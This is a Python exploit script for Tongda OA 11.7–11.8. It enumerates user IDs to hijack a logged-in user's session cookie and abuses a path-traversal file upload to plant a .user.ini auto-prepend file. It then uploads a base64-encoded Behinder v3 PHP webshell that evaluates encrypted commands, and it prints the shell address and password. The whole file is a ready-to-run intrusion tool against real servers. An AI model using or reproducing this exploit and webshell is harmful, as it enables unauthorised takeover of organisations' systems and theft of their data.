import base64
import requests
import sys
import re
import time

# 思路参考:
# https://lorexxar.cn/2021/03/03/tongda11-7rce/
# https://lorexxar.cn/2021/03/09/tongda11-8/

RED = '\x1b[1;91m'
BLUE = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
}


def title():
    print(BOLD + '''
    Title: TongdaOA任意用户登录 + 后台Getshell
    Version: 通达OA 11.7 ~ 11.8
    Author: zjun
    HomePage: https://www.zjun.info
    ''' + ENDC)


def Target_Info(target_url):
    print(BLUE + '\n[*]正在获取版本信息\n' + ENDC)
    url = target_url + '/inc/expired.php'
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        pattern = re.compile('<td class="Big"><span class="big3">(.*?)</span>', re.S)
        info = re.findall(pattern, response.text)
        print(GREEN + info[0].replace('<br>', '').replace(' ', '').replace('	', '').strip() + '\n' + ENDC)
    except:
        print(RED + '未发现版本信息\n' + ENDC)


def Target_URL(target_url, uid):
    url = target_url + '/mobile/auth_mobi.php?isAvatar=1&uid=%d&P_VER=0' % (uid)
    manage = target_url + "/general/"
    print(BLUE + '[*]正在遍历UID=%d' % (uid) + ENDC)
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        if "RELOGIN" in response.text and response.status_code == 200:
            print(RED + '目标用户为离线状态\n' + ENDC)
        elif response.status_code == 200 and response.text == "":
            print(GREEN + '目标用户在线,请先访问: \n' + url + '\n再访问后台: \n' + manage + '\n' + ENDC)
            pattern = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
            cookie = "PHPSESSID={}".format(pattern[0])
            return cookie
        else:
            print(RED + '未知错误，目标可能不存在或不存在该漏洞\n' + ENDC)
            sys.exit(0)
    except Exception as e:
        print(RED + '请求失败,无法建立有效连接\n' + ENDC)
        sys.exit(0)


def Upload_Ini(target_url, cookie):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie': cookie,
        'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
    }
    payload = '/general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/.user'
    data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmluaSIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgphdXRvX3ByZXBlbmRfZmlsZT0xMTExMTEubG9nCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
    try:
        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
        if res.status_code == 200 and '档案已保存' in res.text:
            print(BLUE + '[*] 成功上传.user.ini文件!' + ENDC)
            Upload_Log(target_url, cookie)
        else:
            print(RED + '[-] 上传.user.ini文件失败!' + ENDC)
            sys.exit(0)
    except:
        pass


def Upload_Log(target_url, cookie):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie': cookie,
        'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
    }
    payload = '/general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/111111'
    data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocAplY2hvICdpdCB3b3JrJzsKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOwogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8+Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
    try:
        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
        if res.status_code == 200 and '档案已保存' in res.text:
            print(BLUE + '[*] 成功上传log文件!' + ENDC)
            Get_Shell(target_url, cookie)
        else:
            print(RED + '[-] 上传log文件失败!' + ENDC)
            sys.exit(0)
    except:
        pass


def Get_Shell(target_url, cookie):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Cookie': cookie
    }
    payload = '/general/reportshop/workshop/report/attachment-remark/form.inc.php'
    try:
        res = requests.get(url=target_url + payload, headers=headers, timeout=5)
        if res.status_code == 200 and 'it work' in res.text:
            print(GREEN + '[+] 成功上传冰蝎三Shell, 密码为: rebeyond' + ENDC)
            print(GREEN + '[+] Shell地址为: {}'.format(target_url + payload) + ENDC)
        else:
            print(GREEN + '[+] 成功上传冰蝎三Shell, 密码为: rebeyond' + ENDC)
            print(GREEN + '[+] Shell地址为: {}'.format(target_url + payload) + ENDC)
            print(RED + '[!] 可能需要等待一会儿即可连接。' + ENDC)
    except:
        pass


if __name__ == '__main__':
    title()
    target_url = str(input(BOLD + 'Url: ' + ENDC))
    Target_Info(target_url)
    res = input(BOLD + '默认sleep=0, 是否遍历UID? (y/n): ' + ENDC)
    if res == 'y':
        for i in range(1, 1000):
            uid = i
            time.sleep(0)
            cookie = Target_URL(target_url, uid)
            if cookie != None:
                break
    else:
        print(BOLD + '\n[+]exit' + ENDC)
        sys.exit(0)
    res = input(BOLD + '默认shell为冰蝎三, 是否GetShell? (y/n): ' + ENDC)
    if res == 'y':
        Upload_Ini(target_url, cookie)
    else:
        print(BOLD + '\n[+]exit' + ENDC)
        sys.exit(0)
